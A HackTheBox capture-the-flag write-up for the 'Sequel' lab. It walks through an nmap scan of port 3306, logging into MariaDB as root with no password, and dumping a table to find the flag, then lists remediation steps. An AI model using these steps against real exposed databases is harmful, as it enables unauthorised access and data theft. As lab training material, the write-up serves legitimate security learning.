# Sequel - HackTheBox Writeup 🗄️

## 🚩 Room Information
- **Platform:** [HackTheBox](https://app.hackthebox.com/)
- **Track:** Starting Point - Tier 0
- **Difficulty:** Very Easy
- **Category:** Database Security / MariaDB & MySQL
- **Status:** ✅ Completed

---

## 🎓 Learning Objectives
- Enumerating database management services exposed over the network.
- Interacting with **MariaDB / MySQL** database servers using the `mysql` CLI client.
- Discovering blank/default root credentials on exposed database instances.
- Performing basic SQL queries (`SHOW DATABASES`, `SHOW TABLES`, `SELECT`).

---

## 🧠 Knowledge Required
- Basic SQL syntax.
- Command-line usage of `mysql` tool (`mysql -h <IP> -u <USER>`).

---

## 🔍 Step-by-Step Walkthrough

### 1. Port Enumeration
Scan the target IP address for MySQL database services:
```bash
nmap -sV -p 3306 <TARGET_IP>
```
* **Discovered Open Port:** `3306/tcp` running `MariaDB 10.3.27`.

### 2. Service Exploitation
Attempt remote authentication as the `root` user without specifying a password:
```bash
mysql -h <TARGET_IP> -u root
```
Access is granted directly to the MariaDB monitor shell!

### 3. Database Enumeration & Querying
List available databases:
```sql
MariaDB [(none)]> SHOW DATABASES;
```
* **Discovered Databases:** `information_schema`, `htb`, `mysql`, `performance_schema`.

Select the `htb` database:
```sql
MariaDB [(none)]> USE htb;
```

List tables inside `htb`:
```sql
MariaDB [htb]> SHOW TABLES;
```
* **Discovered Table:** `config`.

Dump table contents to find the flag:
```sql
MariaDB [htb]> SELECT * FROM config;
```

---

## 🛡️ Remediation & Key Takeaways
- **Bind Address Restriction:** Bind MySQL/MariaDB services to `127.0.0.1` unless remote connections are strictly necessary.
- **Set Strong Passwords:** Never leave administrative database accounts (`root`) without a strong password.
- **Firewall Controls:** Restrict access to database ports (3306) using host-based and network firewalls.

---
*Based on HackTheBox content. Compiled by [Amit Padhan](https://github.com/amitpadhan525)*
